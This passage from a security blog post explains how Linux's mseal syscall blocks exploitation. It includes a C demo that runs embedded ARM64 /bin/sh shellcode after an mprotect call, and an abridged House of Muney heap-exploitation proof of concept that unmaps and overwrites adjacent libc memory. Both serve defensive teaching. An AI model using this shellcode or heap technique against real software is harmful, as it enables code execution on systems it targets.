<li>Exploit the target’s bug to kick off an initial ROP chain to call <code>mprotect</code> with <code>PROT_EXEC</code> to target the region holding the shellcode and turn off the NX bit.</li>
<li>Jump to it to revive old-school shellcoding!</li>
</ul>
<p>The exploit for <a href="https://packetstormsecurity.com/files/146795/MikroTik-RouterOS-SMB-Buffer-Overflow.html">CVE-2018-7445</a> targeting Mikrotik RouterOS’s SMB daemon is a notable example. A socket-based shellcode is sprayed onto the non-executable heap, and the crafted ROP chain from a stack overflow modifies heap memory permissions before executing shellcode.</p>
<p>The most straightforward use case for memory sealing is disallowing VMA permission modification; once that happens, exploits that want to take advantage of traditional shellcode won’t be able to switch off executable bits.</p>
<p>As mentioned, <code>mseal</code> will be introduced in glibc 2.41+, where the dynamic loader will apply sealing across a <a href="https://lwn.net/Articles/978010/">predetermined set of VMAs</a>. However, at the time of writing, this will <em>not be done automatically for the stack or heap</em>.</p>
<p>This is expected because these regions can expand during runtime. For instance, a heap allocator that wants to reclaim space will invoke the <code>brk</code> syscall, which could call <code>arch_unmap</code> and eventually <code>do_vmi_unmap</code> to perform shrinking. Of course, this would be disallowed under sealing and thus break dynamic memory allocation for the application altogether.</p>
<p>So, for now, the software developer is responsible for protecting these regions, as they have the context to determine when and where sealing should be applied appropriately.</p>
<p>Let’s use <code>mseal</code> to enhance the stack’s old-school NX (non-executable) protection. Here’s a simple example that emulates the scenario mentioned above:</p>
<pre><span>int</span> main(<span>void</span>)
{
    /* represents the stack that now contains /bin/sh shellcode we somehow sprayed */
    <span>unsigned char</span> exec_shellcode[] =
<span>"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";</span>

    <span>// vulnerability triggered, hijacked instruction pointer</span>

    /* ======= what our ROP chain would do: ======= */


    /* compute the start of the page <span>for</span> the shellcode */
    <span>void</span> (*exec_ptr)() =  (<span>void</span>(*)())&amp;exec_shellcode;
    <span>void</span> *exec_offset = (<span>void</span> *)((int64_t) exec_ptr &amp; ~(getpagesize() - 1));

    mprotect(exec_offset, getpagesize(), PROT_READ|PROT_WRITE|PROT_EXEC);

    /* <span>this</span> now works! */
    exec_ptr();
    <span>return</span> <span>0</span>;
}
</pre>
<p>As we’d expect, setting <code>PROT_EXEC</code> on the VMA permits <code>exec_shellcode</code> to become executable again:</p>
<pre><span>~ gcc stack_no_sealing.c -o stack_no_sealing
~ ./stack_no_sealing
$
</span></pre>
<p>Let’s introduce memory sealing on the stack-based <code>exec_offset</code> VMA range:</p>
<pre><span>int</span> main(<span>void</span>)
{
    /* represents the stack that now contains /bin/sh shellcode we somehow sprayed */
    <span>unsigned char</span> exec_shellcode[] =
"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

    /* compute the start of the page <span>for</span> the shellcode */
    <span>void</span> (*exec_ptr)() =  (<span>void</span>(*)())&amp;exec_shellcode;
    <span>void</span> *exec_offset = (<span>void</span> *)((int64_t) exec_ptr &amp; ~(getpagesize() - 1));

    /* seal the stack page containing the shellcode! */
    <span>if</span> (mseal(exec_offset, getpagesize()) &lt; <span>0</span>)
        handle_error(<span>"mseal"</span>);

    <span>// vulnerability triggered, hijacked instruction pointer</span>

    /* ======= what our ROP chain would <span>do</span>: ======= */

    mprotect(exec_offset, getpagesize(), PROT_READ|PROT_WRITE|PROT_EXEC);
    /* segfault now, as no permission change actually occurred */
    exec_ptr();
    <span>return</span> <span>0</span>;
}
</pre>
<p>The aforementioned <code>can_modify_vma</code> check kicks in when <code>mprotect</code> is called, preventing the permission change from ever happening, and the attempt to shellcode now fails:</p>
<pre><span>~ gcc stack_with_sealing.c -o stack_with_sealing
~ ./stack_with_sealing
[1]    48771 segmentation fault (core dumped)  ./stack_with_sealing
</span></pre>
<p>A simple strategy to accommodate real-world software could involve sparingly introducing a macro-ized version of the <code>mseal</code> code snippet and iteratively sealing pages in select stack frames where untrusted data could reside for exploitation:</p>
<pre>#define SIMPLE_HARDEN_NX_SINGLE_PAGE(frame) \
  <span>do</span> { \
    <span>void</span> *frame_offset = (<span>void</span> *)((int64_t) &amp;frame &amp; ~(getpagesize() - 1)); \
    <span>if</span> (mseal(frame_offset, getpagesize()) == -1) { \
      handle_error("mseal"); \
    } \
  } <span>while</span>(<span>0</span>)

<span>int</span> frame_2(void)
{
    <span>int</span> frame_start = <span>0</span>;
    <span>unsigned char</span> another_untrusted_buffer[<span>1024</span>] = { <span>0</span> };
    SIMPLE_HARDEN_NX_SINGLE_PAGE(frame_start);
    <span>return</span> <span>0</span>;
}

<span>int</span> frame_1(<span>void</span>)
{
    <span>unsigned char</span> untrusted_buffer[<span>1024</span>] = { <span>0</span> };
    SIMPLE_HARDEN_NX_SINGLE_PAGE(untrusted_buffer);
    <span>return</span> frame_2();
}
</pre>
<p>Even if a sealed VMA is reused as a frame for another function with sealing logic, invoking <code>mseal</code> again would be considered a no-op, so no errors would emerge. Of course, developers should be mindful of edge cases like automatic stack expansion from aggressive usage or bespoke features like <a href="https://gcc.gnu.org/wiki/SplitStacks">stack splitting</a>.</p>
<p>Hopefully, as the integration of <code>mseal</code> into glibc continues, we’ll see tunables emerge that do not require any manual use of the syscall for the stack. Commenters in the LWN mailing list <a href="https://lwn.net/Articles/958956/">yearn for an automatic sealing that can be toggled for simpler applications</a>.</p>
<p>And with all this said, if an attacker doesn’t want to fully ROP and insists on bringing back shellcode nostalgia, they could always use their initial code reuse technique to mmap a fresh region that is executable. However, this is pretty laborious, as it now involves copying the exploit payload from a readable region to this new mapping.</p>
<h4>Mitigating unmapping-based, data-only exploitation</h4>
<p>Disallowing <code>mprotect</code> also prevents a sealed region from becoming writable, which is valuable if there are data variables that, when modified, could enhance an exploit primitive. However, during the inception of <code>mseal</code>, Chrome maintainers rationalized an easier and more powerful technique with the added benefit of circumventing CFI (control-flow integrity). They determined that if an attacker can pass a corrupted pointer to unmapping/remapping syscalls, they can “punch a hole” in memory that could be refilled with attacker-controlled data. This would not violate CFI guarantees, as forward- and backward-edge CFI would cover only tampered control-flow transitions (e.g., stack return addresses and function pointers).</p>
<p>This is incredibly enticing for a browser implementing a JIT compiler. V8’s Turbofan can create regions that switch between RW and RX, aiding the refill process and changing permissions. Thus, an attacker can take advantage of the JIT compilation process by emitting executable code from hot-path JavaScript into the unmapped region to overwrite critical data and then leverage modifications to yield code execution.</p>
<p>We argue this is a <em>data-only</em> exploitation technique, as it doesn’t involve directly hijacking control flow or requiring leaked pointers but rather tampering with particular data in memory that influences control flow to the attacker’s liking. In an era of mitigations like CFI, this has emerged as a pretty potent technique during exploitation. Thus, memory sealing can prevent these particular data-only techniques by disallowing hole-punching scenarios.</p>
<p>This particular data-only technique isn’t just for browsers with JIT compilers! A similar technique would be the <a href="https://maxwelldulin.com/BlogPost/House-of-Muney-Heap-Exploitation">House of Muney</a> for userspace heap exploitation. As Max Dulin points out in his post, Qualys used this technique to perform a <a href="https://www.qualys.com/2020/05/19/cve-2005-1513/remote-code-execution-qmail.txt">real-world exploit for an ancient bug in Qmail</a>.</p>
<p>This technique relies on the fact that for huge allocated chunks (greater than the <a href="https://www.gnu.org/software/libc/manual/html_node/Malloc-Tunable-Parameters.html"><code>M_MAP_THRESHOLD</code></a> tunable), <code>malloc</code> and <code>free</code> will directly invoke <code>mmap</code> and <code>munmap</code>, respectively, with no intermediate freelists that cache any freed chunks (which helps greatly simplify exploitation). Since size metadata exists at the top of allocated chunks, tampering it to a different page size and freeing it would cause a <code>munmap</code> on memory regions adjacent to the chunk. Dulin used the arbitrary <code>munmap</code> to target the <code>.gnu.hash</code> and <code>.dynsym</code> regions and after refilling them with another larger mmap chunk, enabled the overwriting of a single, yet-to-be-resolved PLT entry, reviving a GOT overwrite-style attack!</p>
<p>Dulin has a very well-done and annotated PoC for this attack <a href="https://github.com/mdulin2/house-of-muney/blob/master/munmap_rewrite.c">here</a>. Here’s an abridged version that goes up to the point where the unmapping and refill occur:</p>
<pre>#<span>include</span> <span>&lt;stdio.h&gt;</span>
#<span>include</span> <span>&lt;string.h&gt;</span>
#<span>include</span> <span>&lt;stdlib.h&gt;</span>
#<span>include</span> <span>&lt;malloc.h&gt;</span>

<span>// With this allocation size,
// malloc is now equivalent to mmap
// free is now equivalent to munmap</span>
#define THRESHOLD_SIZE <span>0x100000</span>

<span>int</span> main() {
    <span>long long</span> *bottom, *top, *refill;

    bottom = malloc(THRESHOLD_SIZE);
    memset(bottom, <span>'B'</span>, THRESHOLD_SIZE);

    <span>// [1] Allocation that we write into out-of-bounds from a prior chunk</span>
    top = malloc(THRESHOLD_SIZE);
    memset(top, <span>'A'</span>, THRESHOLD_SIZE);

    <span>// [2] Corrupts size field, ensuring page alignment + mmap bit is set</span>
    <span>// size to unmap = top + bottom + large arbitrary size</span>
    <span>int</span> unmap_size = (<span>0xfffffffd</span> &amp; top[<span>-1</span>]) + (<span>0xfffffffd</span> &amp; bottom[<span>-1</span>]) + <span>0x14000</span>;
    top[<span>-1</span>] = (unmap_size | <span>2</span>);

    <span>// Trigger munmap with corrupted chunk</span>
    free(top);

    <span>// [3] Refill with new and larger mmap chunk</span>
    refill = malloc(<span>0x5F0000</span>);
    memset(refill, <span>'X'</span>, <span>0x5F0000</span>);
    <span>return</span> <span>0</span>;
}
</pre>
<p>By the time we finish <code>[1]</code>, we can see that the <code>top</code> and <code>bottom</code> chunks now exist in a separate mapping below the heap, separated by 4096-byte padding. Note the adjacent libc mapping at <code>0xfffff7df0000</code>:</p>
<p><img fetchpriority="high" decoding="async" data-attachment-id="108462" data-permalink="https://blog.trailofbits.com/2024/10/25/a-deep-dive-into-linuxs-new-mseal-syscall/figure_1-9/" data-orig-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2.png" data-orig-size="1999,554" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="figure_1" data-image-description="" data-image-caption="" data-medium-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2-300x83.png" data-large-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2-1650x457.png" tabindex="0" role="button" src="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2-1650x457.png" alt="" width="690" height="191" srcset="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2-1650x457.png 1650w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2-300x83.png 300w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2-768x213.png 768w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2-1536x426.png 1536w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_1-2.png 1999w" sizes="(max-width: 690px) 100vw, 690px"></p>
<p>At <code>[2]</code>, we corrupt the <code>size</code> field of the chunk to a much larger page size and ensure that the <code>mmap</code> bit is set. When we break on the <code>munmap</code> occurring in the free <code>[3]</code>, the <code>size</code> argument passed has been changed, allowing an unmap into the adjacent region!</p>
<p><img decoding="async" data-attachment-id="108463" data-permalink="https://blog.trailofbits.com/2024/10/25/a-deep-dive-into-linuxs-new-mseal-syscall/figure_2-9/" data-orig-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2.png" data-orig-size="1658,700" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="figure_2" data-image-description="" data-image-caption="" data-medium-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2-300x127.png" data-large-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2-1650x697.png" tabindex="0" role="button" src="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2-1650x697.png" alt="" width="690" height="291" srcset="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2-1650x697.png 1650w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2-300x127.png 300w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2-768x324.png 768w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2-1536x648.png 1536w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_2-2.png 1658w" sizes="(max-width: 690px) 100vw, 690px"></p>
<p>After <code>[3]</code>, this can be confirmed by examining the contents of the previous libc mapping at <code>0xfffff7df0000</code>, now partially overwritten with <code>X</code>s:</p>
<p><img decoding="async" data-attachment-id="108464" data-permalink="https://blog.trailofbits.com/2024/10/25/a-deep-dive-into-linuxs-new-mseal-syscall/figure_3-9/" data-orig-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_3-2.png" data-orig-size="1522,336" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="figure_3" data-image-description="" data-image-caption="" data-medium-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_3-2-300x66.png" data-large-file="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_3-2.png" tabindex="0" role="button" src="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_3-2.png" alt="" width="1522" height="336" srcset="https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_3-2.png 1522w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_3-2-300x66.png 300w, https://blog.trailofbits.com/wp-content/uploads/2024/10/figure_3-2-768x170.png 768w" sizes="(max-width: 1522px) 100vw, 1522px"></p>
<p>This is a pretty nifty data-only technique that can operate even in the presence of CFI and does not require a prerequisite ASLR leak!</p>
<p>Luckily, the aforementioned set of VMAs in <code>mseal</code>’s glibc integration is expected to automatically mitigate this without any developer intervention, as mapped binary code and dynamic libraries become sealed from any remap/unmapping tricks like this. For additional hardening, a developer can selectively seal mmap allocations that they know will never expand or become unmapped during the lifetime of their program. This will have the added benefit of preventing the previous exploit scenario if attacker-controlled data can be expected to be written into the mmap chunks and may become writable/executable.</p>
<h3>Build stronger software with mseal</h3>
<p>There are likely many other use cases and scenarios that we didn’t cover. After all, <code>mseal</code> is the newest kid on the block in the Linux kernel! As the glibc integration completes and matures, we expect to see improved iterations for the syscall to meet particular demands, including fleshing out the ultimate use of the <code>flags</code> parameter.</p>
<p>Hardening software is complex, as navigating and evaluating new security mitigations can be challenging in understanding the risk and reward payoff. If this blog post is interesting to you, check out some of our escapades into other <a href="https://blog.trailofbits.com/2023/04/20/typos-that-omit-security-features-and-how-to-test-for-them/">security</a> <a href="https://blog.trailofbits.com/2016/12/27/lets-talk-about-cfi-microsoft-edition/">mitigations</a>. If you’re seeking guidance in integrating <code>mseal</code> or any other modern mitigations into your software, <a href="https://www.trailofbits.com/contact/">contact us</a>!</p>

			</div><!-- .entry-content -->

	
</article><!-- #post-108435 -->
						<!-- #nav-below -->
		
					<!-- #comments .comments-area -->

			
			</div></div>]]></description>
        </item>
    </channel>
</rss>